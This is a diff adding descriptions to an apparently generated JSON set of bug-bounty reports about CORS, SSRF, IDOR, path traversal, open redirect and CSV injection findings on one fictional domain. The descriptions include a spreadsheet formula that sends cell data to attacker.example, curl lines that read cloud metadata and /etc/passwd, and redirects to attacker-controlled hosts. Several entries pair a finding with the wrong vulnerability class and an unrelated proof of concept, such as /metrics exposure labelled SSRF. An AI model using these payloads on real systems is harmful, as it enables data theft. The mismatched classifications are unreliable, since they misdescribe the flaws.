+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16406,7 +16529,8 @@
           "offset": "4d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16546,7 +16670,8 @@
           "offset": "13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16690,7 +16815,8 @@
           "offset": "7d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16805,7 +16931,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16925,7 +17052,8 @@
           "offset": "3d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17085,7 +17213,8 @@
           "offset": "6d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17225,7 +17354,8 @@
           "offset": "3d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17335,7 +17465,8 @@
           "offset": "19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17462,7 +17593,8 @@
           "offset": "5d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17606,7 +17738,8 @@
           "offset": "6d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17773,7 +17906,8 @@
           "offset": "7d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17909,7 +18043,8 @@
           "offset": "7d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18043,7 +18178,8 @@
           "offset": "6d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18137,7 +18273,8 @@
           "offset": "1d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18269,7 +18406,8 @@
           "offset": "7d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18425,7 +18563,8 @@
           "offset": "3d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18573,7 +18712,8 @@
           "offset": "5d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18675,7 +18815,8 @@
           "offset": "2d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18778,7 +18919,8 @@
           "offset": "4d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18918,7 +19060,8 @@
           "offset": "5d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19027,7 +19170,8 @@
           "offset": "2d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19167,7 +19311,8 @@
           "offset": "6d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19279,7 +19424,8 @@
           "offset": "7d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19413,7 +19559,8 @@
           "offset": "7d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19503,7 +19650,8 @@
           "offset": "3d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19606,7 +19754,8 @@
           "offset": "2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19757,7 +19906,8 @@
           "offset": "9d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.aareguard-cyber.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19848,7 +19998,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19995,7 +20146,8 @@
           "offset": "6d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20134,7 +20286,8 @@
           "offset": "4d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20218,7 +20371,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
